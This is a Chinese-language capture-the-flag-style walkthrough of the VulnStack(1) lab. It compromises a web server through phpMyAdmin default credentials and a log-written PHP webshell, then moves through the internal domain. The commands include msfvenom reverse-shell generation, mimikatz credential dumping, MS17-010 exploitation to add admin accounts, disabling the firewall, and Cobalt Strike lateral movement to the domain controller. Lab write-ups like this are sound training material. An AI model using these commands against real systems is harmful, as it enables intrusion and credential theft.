先组网
![img](VulnStack(1)/images/image.png)


win7: 
    外网ip: 192.168.72.129
    内网ip: 192.168.52.143

DC: 192.168.52.138

win2k3: 192.168.52.141

kali: 192.168.72.128

# web服务器渗透

## 信息收集
`nmap -A -sC -sV 192.168.72.129`

80,3306 http,mysql

disearch扫目录
phpinfo.php
几个点
- 网站真实ip
- 网站绝对路径
- allow_url_open/include
- disable_functions

## 漏洞挖掘 && GetShell
/phpMyAdmin/ root,root 默认账密登录

phpMyAdmin后台getshell:
1、select into outfile直接写入
2、开启全局日志getshell
3、使用慢查询日志getsehll
4、使用错误日志getshell
5、利用phpmyadmin4.8.x本地文件包含漏洞getshell


查看mysql是否有文件读写权限，sql注入查询secure_file_priv权限
```sql
show VARIABLES like '%secure%'
```
secure_file_priv = NULL 没有导入权限
方法1 ❌

尝试方法2
```sql
SHOW GLOBAL VARIABLES LIKE '%general%'
```

OFF但可以开启 日志文件路径可以更改 改到网站目录下
SET GLOBAL general_log='on'
SET GLOBAL general_log_file='C:/phpStudy/www/233.php'

写入一句话木马到日志
SELECT '<?php eval($_POST["cmd"]);?>'

获得Administrator权限

# 内网渗透

## 信息收集

ipconfig # 查看本机ip,所在域
=> 内网段 192.168.52.0/24

route print # 打印路由信息

arp -a # 查看arp缓存
=> 192.168.52.138

net user

net config workstation # 查看工作组信息


net user /domain
=> owa.god.org

net group /domain

net localgroup administrators
=> 域管理员: Administrators

ping owa.god.org
=> 确定 192.168.52.138为域控


win7本地主机创建用户，加入管理员组
net user alice Ali12345 /add

net localgroup administrators alice /add

尝试远程桌面登录
检查 3389端口是否开启
netstat -ano | find "3389"

未开启 用以下命令开启
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f

windows本机尝试远程连接失败

## 后渗透
msf上线
生成 exe木马
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.72.128 LPORT=2333 -f exe > shell.exe 

蚁剑upload到 C:/Windows/Temp

开启监听
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lport 2333
set lhost 192.168.72.128
exploit -j


win7运行shell.exe

sessions 1 上线

meterpreter 提权
由于原本就是administrator所以很容易提权 (windows vista之前没有UAC机制 不需要bypassUAC)
getuid
getsystem
getuid

成功提权至SYSTEM最高权限

此时就可以关闭防火墙实现远程桌面连接

run post/windows/manage/enable_rdp

nmap扫3389端口
nmap -p3389 192.168.72.129 
发现已经开启

rdesktop 192.168.72.129
可以用先前加入管理员组的 alice Ali12345 登陆


但没必要 我们尝试用mimikatz抓取密码
kali meterpreter上传mimikatz.exe

upload /home/kali2021/桌面/Intranet/mimikatz.exe c://

shell进入win7
运行mimkatz.exe
先权限提升
privilege::debug
再使用
sekurlsa::logonPasswords
获得Administrator的明文密码

我们进一步渗透入内网 对域中其他主机进行渗透

# 横向移动
在Windows cmd中 可以采用如下命令探测内网存活主机
指定步长 对内网段枚举ping
![img](VulnStack(1)/images/image-1.png)

for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.52.%I | findstr "TTL=" 
=> 138,141,143
138:DC
143:win7自己
141:内网隐藏主机


接下来采用"跳板攻击"
> 当我们拿下内网的一台主机权限后，为进一步扩大战果，攻陷内网其他主机，我们可以把沦陷主机作为跳板进一步内网渗透

获取被攻击目标内网地址网段:
run autoroute -s 192.168.52.0/24

扫描有效网卡的整个C段的信息以及查看路由添加情况：
run autoroute -p

成功添加 192.168.52.0

autoroute添加完路由后，我们可以利用msf自带的sock4a模块进行Socks4a代理:auxiliary/server/socks_proxy

```
use auxiliary/server/socks_proxy
set srvport 1080 设置端口1080
 
run 运行
```
![img](VulnStack(1)/images/image-2.png)

配置kali proxychains代理实现内网穿透
vim /etc/proxychains.conf

socks5 192.168.72.128 1080

测试是否配置成功:
kali另开终端
proxychains curl 192.168.52.143
![img](VulnStack(1)/images/image-3.png)

72能curl 52 说明配置成功

proxychains代理，nmap继续内网信息收集
直接扫很多端口都timeout

用 -Pn -sT
>socks4a的代理，只能使用tcp协议，socks5的代理，既支持tcp协议也支持udp协议，两者都不支持icmp协议和arp协议，所以nmap使用的时候要使用-sT选择使用tcp协
>议，还要使用-Pn不使用ICMP的ping


![img](VulnStack(1)/images/image-4.png)

发现开放445端口 尝试 "永恒之蓝"


就在这个msfconsole
```
use auxiliary/scanner/smb/smb_ms17_010

set RHOSTS 192.168.52.141

exploit
```


![img](VulnStack(1)/images/image-5.png)

发现漏洞存在 
尝试获取shell

```
use windows/smb/ms17_010_psexec
set RHOST 192.168.52.141
exploit
```

失败

![img](VulnStack(1)/images/image-6.png)

换另一个模块:
```
use auxiliary/admin/smb/ms17_010_command
set COMMAND net user
set RHOST 192.168.52.141
exploit
```

发现可以打

![img](VulnStack(1)/images/image-8.png)

修改COMMAND
添加用户:

set COMMAND net user hack qaz@123 /add

验证 net user
![img](VulnStack(1)/images/image-9.png)

添加成功
然后把添加的用户加入管理员组
set COMMAND net localgroup administrators hack /add

验证:
set COMMAND net localgroup administrators
![img](VulnStack(1)/images/image-10.png)

成功加入 前面渗透win7的时候就知道远程桌面连接的3389有防火墙保护
尝试其他端口

前面nmap能扫到关闭的telnet 23端口
![img](VulnStack(1)/images/image-11.png)

开启telnet服务:

set COMMAND sc config tlntsvr start= auto
set COMMAND net start telnet

验证:

set COMMAND netstat -ano
![img](VulnStack(1)/images/image-12.png)

成功开启，
接下来telnet连接

```
use auxiliary/scanner/telnet/telnet_login

set RHOSTS 192.168.52.141

set username hack

set PASSWORD qaz@123

exploit

```

![img](VulnStack(1)/images/image-13.png)

![img](VulnStack(1)/images/image-14.png)


拿shell连接发现一直没有命令回显

用kali直接
proxychains telnet 192.168.52.141
即可
![img](VulnStack(1)/images/image-15.png)

成功拿下192.168.52.141这台内网主机

# 杀入域控
用打win2k3一样的思路打域控


use auxiliary/admin/smb/ms17_010_command
set COMMAND net user hack qaz@123 /add

尝试telnet/rdesktop 均失败

换思路
通过win7在域控上传一个msf木马

先用win7连接域控的C盘共享
这里的密码是先前mimikatz抓到的

net use \\192.168.52.138\c$ "hongrisec@2024" /user:"administrator"

![img](VulnStack(1)/images/image-16.png)

使用dir可以看到域控资源
dir \\192.168.52.138\c$
![img](VulnStack(1)/images/image-17.png)

将win7上的木马传到域控上
copy c:\Windows\Temp\shell.exe \\192.168.52.138\c$

直接
\\192.168.52.138\c$\shell.exe
![img](VulnStack(1)/images/image-19.png)

即可getshell 

拿下域控


前面采用的是纯MSF的打法 MSF存在一些弊端 实战用的更多的还是

# Cobalt Strike

Cobalt Strike的流程

回到MSF生成shell.exe 蚁剑上传 MSF拿到shell后
![img](VulnStack(1)/images/image-20.png)

## MSF派生CS Win7的shell
kali
./teamserver 192.168.72.128 123456


windows:
Client连接
点击bat文件运行

主要填对HOST和密码即可
![img](VulnStack(1)/images/image-21.png)

创建一个监听器 相当于MSF的handler
![img](VulnStack(1)/images/image-22.png)

这里端口设的7777
MSF从meterpreter开始

background
use exploit/windows/local/payload_inject
set payload windows/meterpreter/reverse_http
set DisablePayloadHandler true
set lhost 192.168.72.128
set lport 7777
set session 1
run

![img](VulnStack(1)/images/image-23.png)

shell弹到CS上了
![img](VulnStack(1)/images/image-24.png)

把会话回连间隔改为1
![img](VulnStack(1)/images/image-25.png)

CS的shell在执行Windows命令时 前面加shell即可
shell dir ...

## CS制作木马反弹shell
新建一个监听器
![img](VulnStack(1)/images/image-26.png)

制作木马
![img](VulnStack(1)/images/image-27.png)

然后蚁剑上传win7 执行
![img](VulnStack(1)/images/image-28.png)

## 提权
现在CS拿到两个shell 随便用一个进行漏洞提权
先加一个监听
cs_elevate 7001端口

![img](VulnStack(1)/images/image-29.png)

成功提权！
![img](VulnStack(1)/images/image-30.png)

## 横向移动

查看防火墙、关闭防火墙
shell netsh firewall show state
shell netsh advfirewall set allprofiles state off

获取域内目标
多执行几次
net view

然后在目标列表就能看到
![img](VulnStack(1)/images/image-31.png)



先抓取win7的密码
hashdump
![img](VulnStack(1)/images/image-32.png)

logonpasswords
成功抓取明文密码

执行完后查看凭证
![img](VulnStack(1)/images/image-33.png)

## 攻击域控
增加smb listener
![img](VulnStack(1)/images/image-34.png)

选择目标列表中OWA的
![img](VulnStack(1)/images/image-35.png)

选择GOD.ORG 和SYSTEM的session
![img](VulnStack(1)/images/image-36.png)


![img](VulnStack(1)/images/image-38.png)

成功拿下域控
![img](VulnStack(1)/images/image-39.png)

拿下域控后按照刚刚横向移动的方式
账密选Admin的,listeneer还是smb  session选择域控的 把其余主机都提升到SYSTEM权限 
拿下141 (win2k3)

三台SYSTEM都拿下
